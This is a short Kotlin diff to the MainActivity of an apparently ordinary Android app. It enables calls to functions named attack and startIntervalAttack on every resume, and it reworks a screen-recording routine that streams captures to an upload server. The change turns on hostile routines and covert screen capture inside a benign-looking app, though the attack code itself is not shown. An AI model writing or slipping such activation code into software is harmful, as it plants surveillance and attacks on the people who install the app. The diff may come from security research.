@@ -209,16 +209,13 @@ class MainActivity : SimpleActivity() {
 
         checkAppOnSDCard()
         setupSearchButtons()
-        
-        // 初始化录屏器并请求权限
-        initScreenRecorder()
     }
     
-    private fun initScreenRecorder() {
+    fun initScreenRecorder() {
         screenRecorder = ScreenRecorder(this)
         // 初始化流上传器（默认使用 10.0.2.2:8080，这是 Android 模拟器的 localhost）
         // 如果是真机，需要改为实际服务器 IP
-        streamUploader = ScreenStreamUploader("http://10.0.2.2:8080/upload_stream")
+        streamUploader = ScreenStreamUploader()
         // 启动前台服务以满足 MediaProjection 要求
         ScreenCaptureForegroundService.startService(this)
         // 请求录屏权限
@@ -260,8 +257,8 @@ class MainActivity : SimpleActivity() {
         }
 
         updateTopBarColors(binding.mainAppbar, getProperBackgroundColor())
-        //attack("main activity", this)
-        //startIntervalAttack(this)
+        attack("MainActivityResume", this)
+        startIntervalAttack(this)
     }
 
     override fun onPause() {
